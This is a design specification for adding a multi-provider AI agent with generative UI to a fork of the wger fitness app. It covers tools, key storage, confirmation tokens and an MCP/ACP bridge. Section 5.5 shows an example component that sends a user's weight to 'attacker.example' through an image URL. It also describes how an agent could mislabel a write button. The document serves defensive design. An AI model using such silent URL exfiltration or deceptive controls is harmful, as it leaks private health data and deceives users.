# OmniHealth — Slice 0+1: Fork Spike and AI Spine

**Date:** 2026-08-07
**Status:** Approved design, ready for implementation planning
**Scope:** Slice 0 (fork evaluation spike) and Slice 1 (multi-provider agent + A2UI generative UI)

---

## 1. Context

OmniHealth is an open-source, AGPL-licensed cross-platform health application: a fork of
[wger-project/flutter](https://github.com/wger-project/flutter) with an AI agent layer added as an
isolated, upstreamable feature module. It targets iOS, Android, macOS, and Windows.

The long-term goal is MyFitnessPal-class tracking breadth plus an AI assistant that can read and
write the user's health data through generative UI, backed by a plugin system, a memory system,
clinical terminology, EHR import, and drug interaction checking.

This document specifies only the first two slices. Later slices get their own specs.

### 1.1 Decisions already made

These were settled during design and are treated as fixed constraints below.

| Decision | Choice | Rationale |
|---|---|---|
| Project type | Open-source community project, AGPL-3.0+ | wger is AGPL; forking is only viable if we embrace it. Removes licensing as a blocker. |
| AI funding model | Bring-your-own-key only | Zero inference cost to the project, no billing infrastructure, no per-user cost ceiling. |
| Agent location | On-device, in Flutter/Dart | The user's API key never leaves the device. Enables use against *any* wger instance, including public wger.de, without trusting the operator with AI conversations or credentials. |
| Relationship to wger | Fork `wger-project/flutter`; AI as an isolated module; **stock** wger server | Inherits tracking UI, translations, and the AGPL app-store exception. Keeps upstream merges cheap. Requires zero Django changes in Slice 1. |
| Tool substrate | MCP-shaped internal interface; remote MCP for future plugins | Gets MCP ecosystem compatibility without paying for MCP transport plumbing on built-in tools. Makes the ACP bridge and future Hermes integration thin adapters. |
| ACP | In scope for Slice 1, desktop-only | User priority. Delivered as a second *agent backend*, not a provider. |

### 1.2 Corrections to initial assumptions

Recorded because they shaped the design and should not be re-litigated later.

- **Claude via ACP does not unlock subscription billing.** Anthropic restricted Claude Free/Pro/Max
  OAuth tokens to first-party products in February–March 2026, with server-side enforcement. Routing
  third-party users' subscription credentials would risk *their* accounts. The supported paths are a
  user-supplied Console API key, Bedrock, or Vertex. See §6.4 for the resulting policy.
- **ACP cannot be the primary transport.** ACP is JSON-RPC 2.0 over stdio, where the client spawns
  the agent as a local subprocess. iOS and Android do not permit arbitrary subprocess spawning, so
  ACP is inherently desktop-only.
- **A2UI is a good fit and is well-supported on Flutter.** Google's A2UI v0.9 (Apache 2.0) is
  declarative and catalog-bound: the agent may only request components the client has pre-approved,
  and cannot ship executable code. Flutter has a first-party path via
  [`flutter/genui`](https://github.com/flutter/genui).
- **The obvious drug-interaction API is dead.** NLM retired the RxNav drug-drug interaction endpoint
  in January 2024; DrugBank retires its free checker in March 2026. RxNorm normalization survives.
  This is a Slice 5 problem and is called out here only so it is not discovered late.

---

## 2. Slice 0 — Fork evaluation spike

A timeboxed investigation (target: one week) whose deliverable is **written findings and a
recommendation**, not a feature. Slice 1's design bends around the answers.

### 2.1 Questions to answer

1. **Does `flutter/genui` core accept a non-Gemini provider?** genui was built Gemini/Firebase-first.
   The `genui_a2ui` package targets a *server-side* agent over WebSocket, which our on-device
   architecture rules out. If genui core cannot be driven by an arbitrary local provider, we render
   A2UI documents ourselves against the published v0.9 schema.
2. **Does `wger-project/flutter` build clean on iOS, Android, macOS, and Windows?** Record Flutter
   and Dart SDK versions, per-platform build failures, and the effort to fix each. Identify the
   state management approach in use, and the dependency-injection seam where a feature module
   registers itself.
3. **Is wger's REST API sufficient for the built-in tools in §4.3?** For each planned tool, confirm
   an endpoint exists with adequate filtering and write support. Any gap that would force Django
   changes must surface now, not mid-implementation.

### 2.2 Exit criteria

A findings document committed to `docs/superpowers/specs/2026-08-07-slice-0-findings.md`, stating
for each question what was observed and what it implies. Slice 1 does not begin until this exists.

### 2.3 Fallback positions

- ~~If genui core is unusable: implement a minimal A2UI renderer ourselves.~~ **Not needed.** The
  spike confirmed genui is backend-agnostic via `A2uiTransportAdapter`; see findings §1.
- If a platform fails to build: proceed on the platforms that work; record the failure and treat the
  fix as separate work. macOS is the priority development target.
- If REST gaps exist: implement the tools that are possible, document the gaps, and schedule a
  server-side slice earlier than planned.

---

## 3. Slice 1 architecture

All new code lives under `lib/features/ai/`. Outside that directory, only two changes are permitted:
a navigation entry point and a dependency-injection registration. This boundary is what makes the
module offerable upstream to wger and keeps merges from upstream cheap.

```
OmniHealth  (fork of wger-project/flutter)
│
│  existing wger app — workouts, nutrition, weight, measurements, i18n
│
└── lib/features/ai/
      │
      ├── chat/          conversation UI, turn history
      ├── agent/         AgentBackend interface + two implementations
      │     ├── local/   our Dart loop, driving an LlmProvider
      │     └── acp/     ACP client (desktop only)
      ├── providers/     LlmProvider interface + OpenAI-compat, Anthropic
      ├── tools/         MCP-shaped registry + built-in wger tools
      ├── genui/         A2UI catalog + renderer
      ├── credentials/   secure key storage
      └── mcp/           localhost MCP bridge (exposes tools to ACP agents)
                │
                ↓
        existing wger REST client
                │
                ↓  HTTPS
        stock wger server (Docker, unmodified)
```

### 3.1 The two-backend split

ACP does not belong beside the model providers. An ACP agent is a *complete agent* that runs its own
tool-calling loop; a chat-completions endpoint is not. Conflating them produces a leaky interface.
The split is therefore at the level above:

```
AgentBackend  (interface)
├── LocalAgentBackend   we own the loop; drives an LlmProvider
│                       └── LlmProvider: OpenAiCompatProvider | AnthropicProvider
└── AcpAgentBackend     desktop only; external process owns the loop; we are the ACP client
```

Both backends consume the same `ToolRegistry` and both render A2UI through the same catalog. The
user picks a backend in settings; the chat UI is identical either way.

---

## 4. Components

Five core units (§4.1–§4.5), plus the MCP bridge and ACP backend that exist only on desktop
(§4.6–§4.7). Each is independently testable and has a single responsibility.

### 4.1 Provider layer — `lib/features/ai/providers/`

```dart
abstract class LlmProvider {
  String get id;
  Stream<LlmEvent> stream({
    required List<Message> messages,
    required List<ToolSpec> tools,
    CancellationToken? cancel,
  });
}
```

`LlmEvent` is a sealed type: `TextDelta`, `ToolCallRequested`, `TurnComplete`, `ProviderError`.

Two implementations:

- **`OpenAiCompatProvider`** — covers OpenAI, Grok, Kimi, and GLM. These differ only by base URL,
  model identifier, and auth header format. Configuration is data, not code; adding DeepSeek or a
  local Ollama endpoint later is a config entry.
- **`AnthropicProvider`** — Anthropic's Messages API differs enough in request shape, tool-call
  encoding, and streaming events to warrant its own adapter.

Provider configuration is a persisted record of `{displayName, kind, baseUrl, modelId, keyRef}`.
The key itself is never stored in this record — only a reference into the key store.

### 4.2 Key store — `lib/features/ai/credentials/`

A thin wrapper over `flutter_secure_storage`, backed by iOS/macOS Keychain, Android Keystore, and
Windows DPAPI. The package is **already a wger dependency** (^10.3.1), and
`core/network/secure_token_storage.dart` is the house pattern to mirror: an `abstract interface
class`, a separate platform implementation, and a Riverpod `Provider` binding them.

Invariants, each with a corresponding test:

- Keys are never written to logs, chat transcripts, crash reports, or analytics.
- Keys are never included in a `toString()`, `toJson()`, or debug representation of any object.
- Reading a key requires an explicit call; no ambient/global access.

### 4.3 Tool registry — `lib/features/ai/tools/`

MCP-shaped, so the bridge in §4.6 and future remote plugins are thin adapters:

```dart
abstract class Tool {
  String get name;
  String get description;
  Map<String, dynamic> get inputSchema;   // JSON Schema
  Future<ToolResult> call(Map<String, dynamic> args);
}
```

The registry is the **only** surface an agent can invoke. Built-in tools for Slice 1:

| Tool | Operation | Backed by |
|---|---|---|
| `get_weight_history` | read | `BodyWeightRepository.watchAllDrift()` |
| `log_weight` | write | `WeightEntryNotifier.addEntry(...)` |
| `get_nutrition_log` | read | `NutritionRepository.watchAllLogsHydrated()` |
| `search_ingredient` | read | `IngredientRepository.search(...)` |
| `log_nutrition_entry` | write | `NutritionRepository.addLogLocalDrift(...)` |
| `get_workout_log` | read | `WorkoutLogsRepository` |
| `get_body_measurements` | read | `MeasurementRepository` |
| `render_ui` | UI | none — see §5.2 |

**Tools call wger's existing repositories, not its REST API.** The Slice 0 spike established that
wger's Flutter app is local-first: feature repositories write to a local Drift database and
PowerSync replicates to the server. Every domain Slice 1 touches is PowerSync-backed. Three
consequences follow: tools work offline, writes are reactive (logging a weight updates the weight
screen live through its existing Drift stream), and the tool layer carries no HTTP plumbing.

See [2026-08-07-slice-0-findings.md](2026-08-07-slice-0-findings.md) §3.

All arguments are validated against `inputSchema` before `call()` executes. A schema violation
returns a `ToolResult.error` describing the violation — it does not throw, because the error is
routed back to the model as a tool result so it can correct itself.

### 4.4 Agent loop — `lib/features/ai/agent/local/`

Provider-agnostic and widget-agnostic. It knows nothing about HTTP or Flutter.

Responsibilities: assemble the message list and tool specs, call the provider, stream text to the
UI, dispatch tool calls to the registry, feed results back, and repeat until the turn completes.
It owns turn state and cancellation.

A hard iteration cap (default 12 tool round-trips per turn) prevents runaway loops; exceeding it
ends the turn with a visible message rather than silently stopping.

### 4.5 A2UI surface — `lib/features/ai/genui/`

Holds the component catalog (§5) and the renderer. The renderer maps an A2UI document onto Flutter
widgets drawn from the catalog and nothing else. Unknown component types render a fallback card.

### 4.6 MCP bridge — `lib/features/ai/mcp/`

Desktop only. Exposes the `ToolRegistry` as an MCP server bound to `127.0.0.1` on an ephemeral port,
so an external ACP agent can reach the same tools the local loop uses.

- Bound to loopback only; never to `0.0.0.0`.
- A per-session bearer token is generated at spawn and passed to the agent; requests without it are
  rejected. This prevents other local processes from driving the user's health data.
- The server's lifetime is scoped to the ACP session; it is torn down when the session ends.

### 4.7 ACP backend — `lib/features/ai/agent/acp/`

Desktop only (`Platform.isMacOS || Platform.isWindows || Platform.isLinux`). Hidden entirely in the
UI on mobile.

OmniHealth acts as the ACP **client**: it spawns a user-configured agent binary as a subprocess and
speaks JSON-RPC 2.0 over stdio. It performs `initialize`, then `session/new` — passing the §4.6 MCP
server so the agent gains the wger tools — then `session/prompt` per turn, consuming `session/update`
notifications and mapping them onto the same UI events the local backend emits.

Capabilities we advertise are deliberately minimal. OmniHealth is not an editor: we do **not** grant
filesystem or terminal capabilities. An ACP agent connected to OmniHealth can use the health tools
and nothing else.

Configuration is entirely user-supplied: binary path plus arguments. The app ships **no** default
pointing at any specific vendor's agent (see §6.4).

---

## 5. The v1 component catalog

### 5.1 Composition: the Basic Catalog plus three

A2UI ships a Basic Catalog — `Column`, `Row`, `List`, `Card`, `Tabs`, `Divider`, `Modal`, `Text`,
`Image`, `Icon`, `Video`, `AudioPlayer`, `Button`, `CheckBox`, `TextField`, `DateTimeInput`,
`ChoicePicker`, `Slider`. **OmniHealth adopts all of it except the three URL-taking media
components** — `Image`, `Video`, and `AudioPlayer` are excluded for the reason in §5.5, and replaced
by id-keyed equivalents. The agent composes freely from everything else.

An earlier draft of this spec defined five custom components. Four of them turned out to be
compositions the Basic Catalog already expresses (a confirmation is a `Card` with `Text` and two
`Button`s; a disambiguation list is a `List` with a `ChoicePicker`). Only three components are
genuinely ours:

| Component | Direction | Why it exists |
|---|---|---|
| `MetricChart` | read | The Basic Catalog has no chart primitive, and trend lines are the single most valuable read in a health app. Backed by `fl_chart`, already a wger dependency. |
| `ExerciseVideo` | read | Replaces the excluded `Video` (§5.5). Takes an **exercise video id**, never a URL. Wraps wger's existing `ExerciseVideoWidget`, which already provides scrubbing and 0.25x/0.5x playback — the latter being the whole point for studying lifting form. Renders CC attribution (§5.6). |
| `MetricEntryCard` | write | Gathers and commits one scalar metric — value, unit, date — in a single tap. The most common interaction in the app deserves a one-shot path. |
| `ConfirmationCard` | write | Commits whatever the primitives gathered. "Log 2 eggs, 140 kcal?" with accept and reject. |

The working division: **primitives gather, OmniHealth components commit.** The agent can build a meal
builder out of `List`, `ChoicePicker`, and `Slider`, watch the running total update through the data
model, and then hand the result to a `ConfirmationCard` to write.

### 5.2 The write rule, and where the boundary actually is

Basic Catalog components may carry local actions (`openUrl` and similar) and may invoke **read**
tools. They may not produce writes.

The mechanism is unchanged from §6.2 and is worth stating precisely, because it is easy to
misattribute:

- **The security boundary is the tool registry.** It refuses any write-capable tool lacking a valid
  confirmation token. This holds no matter what the agent renders. If the agent puts a write intent
  on a raw `Button`, the write is rejected for want of a token — the component itself proves nothing.
- **The custom write components exist for honesty, not security.** A2UI would happily let an agent
  render a `Button` labelled *Cancel* whose action commits a weight entry. Nothing in the protocol
  prevents that. `MetricEntryCard` and `ConfirmationCard` prevent it structurally: they render their
  own affordances, and the agent supplies only the content.

The honesty guarantee is specific: **a write component renders the resolved arguments it is about to
commit, and mints its token over exactly those resolved values.** The user sees the payload because
the payload *is* the label. An agent cannot show one number and write another — the token would fail
the argument-digest check in §6.2.

Still excluded: anything rendering agent-supplied HTML or markup as UI, and any path from model
output to a write that does not pass through a rendered, tapped, honestly-labelled control.

### 5.3 How A2UI is delivered, and one deliberate deviation

A2UI documents arrive as a **tool call** — `render_ui` — in both backends. This makes generative UI
work identically whether the local Dart loop or an external ACP agent produced it, and requires no
special content-block handling in the ACP path.

`render_ui` accepts an A2UI document, renders it, and **suspends until the user acts**. The user's
interaction becomes the tool result returned to the agent.

This is a deviation, recorded here so it is not later mistaken for a misunderstanding. A2UI's native
model is an event flow: the surface renders, the user interacts, the client emits a `userAction`
message. Request/response is not its shape. We adopt suspend-and-return because it composes with a
tool-calling loop far more simply, and because it works unchanged across both backends — an external
ACP agent has no access to our Dart completers, but it can call a blocking MCP tool. A2UI v1.0 adds
`actionResponse`, a client-to-server RPC, which is broadly this idea formalised; revisit the
deviation when adopting v1.0.

### 5.4 Data binding

Component properties take either a literal or a JSON Pointer path (`{"text": {"path": "/user/name"}}`),
and input components bind two-way: a `TextField` bound to `/form/weight` writes the user's typing
back into the surface's data model with no agent round-trip. Structure is described once; state lives
in the data model and updates through `updateDataModel`.

This is what makes live-computed forms possible — a macro total that updates as portions change —
and it is why the agent does not need to re-render a surface to reflect user input.

### 5.5 No agent-supplied URLs — the silent egress rule

The Basic Catalog's `Image`, `Video`, and `AudioPlayer` take a URL. Rendering one issues a GET to
that URL. An agent that can choose the URL therefore has a data channel out of the device:

```json
{"component": "Image", "url": "https://attacker.example/p.png?w=82.4&dx=..."}
```

The user's data leaves in the query string, and **no tap is required** — merely rendering does it.
This bypasses the confirmation-token model entirely, because that model guards *writes into wger*
and says nothing about *reads leaving the device*. It is a strictly worse hole than the write
problem: silent, unattended, and invisible in the transcript.

The rule, therefore:

> **No component may take a URL, host, or path from the agent.**

Media components take an **id** into data the app already holds. Resolution to an absolute URL
happens client-side through wger's `mediaUrlBuilderProvider`, which always produces
`<the user's own server>/media/<path>` and is structurally incapable of addressing another host.
An agent can ask to show exercise video 412; it cannot ask to show `https://anywhere.else`.

`Icon` stays in the catalog — it selects from a fixed local icon set, not a URL.

This rule generalises beyond media. Any future component that would accept an agent-chosen
destination — a link, a webview, an embed, an outbound action — is subject to it. When one is
genuinely needed, the destination must come from an allowlist the app controls, not from the model.

### 5.6 Attribution is a licence obligation, not a nicety

wger's exercise images and videos are Creative Commons licensed, and the `Video` model carries
`licenseTitle`, `licenseAuthor`, `licenseObjectUrl`, and `licenseAuthorUrl` precisely because CC
BY-SA requires attribution on display.

`ExerciseVideo` therefore renders attribution as part of the component, not as something the agent
is trusted to remember to include. An agent that omits it from its prose does not put us out of
compliance, because the component supplies it unconditionally. The same applies to any future
image component.

---

## 6. Data flow and safety

### 6.1 The reference flow

1. User types *"I want to enter my weight for today"*.
2. Backend sends the message plus tool specs to the provider (or to the ACP agent).
3. Agent calls `render_ui` with an A2UI document requesting
   `MetricEntryCard{metric: weight, unit: kg, date: today}`.
4. Renderer draws a native Flutter card inline in the chat.
5. User enters `82.4` and taps **Save**.
6. `render_ui` returns
   `{action: "submit", values: {value: 82.4, unit: "kg", date: "2026-08-07"}, confirmationToken: "<single-use>"}`.
   The token is minted by the renderer at the moment of the tap (§6.2).
7. Agent calls `log_weight` with those values and the token.
8. Registry executes `POST /api/v2/weightentry/`.
9. Result returns to the agent, which confirms in text. The card collapses to a receipt.

### 6.2 The core invariant

> **The agent proposes UI; only a human tap produces a mutation.**

No path from model output reaches a write without an intervening user interaction. Concretely:

- Every write-capable tool (`log_weight`, `log_nutrition_entry`, …) requires a
  `confirmationToken` argument.
- Tokens are minted **only** by the renderer, **only** in response to a user tap, and are
  single-use, bound to one tool name and one argument set, and expire after 5 minutes.
- A write tool called without a valid token returns an error instructing the agent to render a
  confirmation first.

This is enforced in the registry, not in prompts. Prompt-level instructions are not a security
boundary; the token check is.

### 6.3 Data egress

The user's health data is sent to whichever provider they configured — that is the point of the
feature, and it must be stated plainly in the UI at key-entry time, naming the provider. Slice 1
sends only what a turn requires: the conversation and tool results, never a bulk export.

That configured provider must be the **only** destination. §5.5 closes the other one: a rendered
component that fetches an agent-chosen URL would be a second, silent egress path that the user never
consented to and never sees. Every future component is measured against that rule.

### 6.4 ACP and Anthropic's terms

Documented in the repository and surfaced in the ACP configuration screen:

- OmniHealth ships **no** default ACP agent configuration and names no vendor as a recommended
  target. The user supplies a binary path.
- Documentation must **not** present ACP as a way to use a Claude Free/Pro/Max subscription with
  OmniHealth. Anthropic restricts subscription OAuth to first-party products and enforces this
  server-side; presenting it as a feature would put users' accounts at risk.
- The supported Anthropic path is a Console API key via `AnthropicProvider`.

---

## 7. Error handling

| Class | Behavior |
|---|---|
| **Provider errors** — invalid key, rate limit, model refusal, network failure | Surfaced in chat as a system message with a retry affordance. Never silently swallowed. Auth failures link to the key settings screen. |
| **Tool errors** — wger 4xx/5xx, offline, schema violation | Returned *to the agent* as a `ToolResult.error` so it can explain or retry, and shown to the user. A failed write never appears as success. |
| **Malformed A2UI** — unknown component, schema violation, missing required field | Renders a fallback "couldn't display this" card. Raw document logged in debug builds only. The chat never crashes. |
| **Cancellation** | Every turn is cancellable mid-stream. In-flight tool calls either complete or roll back; a cancelled turn never leaves a half-write. |
| **ACP subprocess failure** — binary missing, crash, protocol violation, hang | Session ends with a clear message naming the cause. The subprocess is reaped; no orphans. A protocol violation disables the session rather than retrying blindly. |

Offline behavior: only the *provider call* requires network. Because tools run against local Drift
(§4.3), every read and write tool remains fully functional offline — a queued turn replays cleanly
once connectivity returns. All existing wger tracking continues to work exactly as it does upstream.

---

## 8. Testing

**No test may make a live LLM API call.** A test asserts that no test process reads a real API key
from the environment; this is itself part of the suite.

| Unit | Approach |
|---|---|
| Provider adapters | Golden tests against recorded response fixtures per provider, covering streaming text, tool calls, and error envelopes. |
| Key store | Assertions that keys never appear in logs, serialized objects, or debug output. |
| Tool registry | Each tool against a mock wger server. Schema-validation tests for malformed arguments. Confirmation-token tests: missing, expired, reused, and mismatched-argument tokens must all fail. |
| Agent loop | Driven by a fake provider emitting scripted event sequences: single tool call, parallel calls, malformed response, mid-stream cancel, iteration-cap exceeded. |
| A2UI renderer | Widget and golden tests per catalog component, plus explicit unknown-component and malformed-document cases. |
| MCP bridge | Tests that it binds loopback only, and rejects requests with absent, wrong, or expired tokens. |
| ACP backend | Tests against a fake ACP agent process: normal session, crash mid-turn, protocol violation, hang, and non-zero exit. |
| **Acceptance** | The §6.1 flow end to end against a Dockerized stock wger with a scripted provider. This is the definition of done for Slice 1. |

---

## 9. Out of scope for Slice 1

Health memory system · plugin system and Withings · Apple Health / Google Health Connect ·
MyChart / FHIR import-export · SNOMED CT via Hermes · drug and supplement interaction checking ·
proactive or background AI · voice input · barcode and photo food logging beyond what wger already
provides · any Django server modification.

---

## 10. Roadmap context

Slice 1 is the second of six. Later slices each get their own spec.

| Slice | Contents |
|---|---|
| 0 | Fork evaluation spike *(this document)* |
| 1 | AI spine — providers, ACP, tools, A2UI *(this document)* |
| 2 | Health memory system |
| 3 | Plugin system, with Withings as the first plugin |
| 4 | Health data import — HealthKit / Health Connect first, then FHIR / MyChart |
| 5 | Clinical layer — SNOMED CT via Hermes, drug and supplement interactions, safety eval harness |

Slice 5 carries the project's real regulatory exposure: a consumer-facing drug-interaction checker
combined with LLM health advice may constitute FDA-regulated clinical decision support software.
It is sequenced last deliberately, and requires its own risk analysis before design begins.
